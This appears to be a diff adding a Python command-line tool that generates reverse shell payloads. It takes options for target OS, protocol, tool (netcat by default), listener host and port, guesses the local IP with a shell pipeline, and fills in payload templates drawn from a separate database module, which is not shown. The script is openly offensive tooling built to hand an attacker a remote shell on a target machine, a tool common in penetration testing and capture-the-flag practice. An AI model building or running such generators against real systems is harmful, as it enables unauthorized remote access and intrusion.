@@ -1,0 +1,69 @@
+#! /usr/bin/env python3
+
+"""
+Generate reverse shell payloads
+"""
+
+import click
+from os import popen
+from json import dumps
+from utils.database import Shell
+
+CONTEXT_SETTINGS = dict(token_normalize_func=lambda x: x.lower().strip())
+
+
+def list_cmds(database):
+    list_str = ''
+    for q, w in database.items():
+        list_str += f'os: {q}\n\t'
+        for e, r in w.items():
+            list_str += f'proto: {e}\n\t\tcmd: '
+            for t in r.keys():
+                list_str += f'{t} '
+            list_str = list_str[:-1]
+            list_str += '\n\t'
+        list_str += '\n'
+                
+    click.echo_via_pager(list_str)
+
+
+@click.command(context_settings=CONTEXT_SETTINGS)
+@click.option('--os', default='linux', help='Target OS: "linux" or "windows". Default: linux')
+@click.option('--proto', default='tcp', help='Protocol to use: "tcp" or "udp". Default: tcp')
+@click.option('--cmd', default='netcat', help='What kind of payload to generate. Use the option "--list-all" to inspect the commands. Default: netcat')
+@click.option('--lhost', default='default', help='IP address to use. Default: guessing which IP address to use')
+@click.option('--lport', default=1337, help='Port to use. Default: 1337')
+@click.option('--list-all', is_flag=True)
+def main(os, proto, cmd, lhost, lport, list_all):
+    db = getattr(Shell(), 'database')
+
+    if list_all is True:
+        list_cmds(db)
+        return None
+
+    keys = db.keys()
+    if os not in keys:
+        click.secho(f'The option "os" is invalid. Supported operating systems: {keys}', bold=True, err=True)
+
+    keys = db[os].keys()
+    if proto not in keys:
+        click.secho(f'The option "proto" is invalid. Supported protocols: {keys}', bold=True, err=True)
+
+    keys = db[os][proto].keys()
+    if cmd not in keys:
+        click.secho(f'The option "cmd" is invalid. Supported commands/tools for target: {keys}', bold=True, err=True)
+
+    del keys
+
+    if lhost == 'default':
+        lhost = popen("ip a|grep -Ei 'enp.*:|eth.*:|wlp.*:|wlan.*:|tun.*:' -A3|grep 'inet '|tail -n1|awk '{print $2}'|awk -F'/' '{print $1}'").read().replace('\n', '')
+
+    for payload in db[os][proto][cmd]:
+        payload = payload.format(lhost=lhost, lport=lport)
+        payload = payload.replace('LEFTBRACKET', '{').replace('RIGHTBRACKET', '}').strip()
+        click.secho(payload, fg='bright_red')
+        click.secho('---', blink=True)
+
+
+if __name__ == '__main__':
+    main()
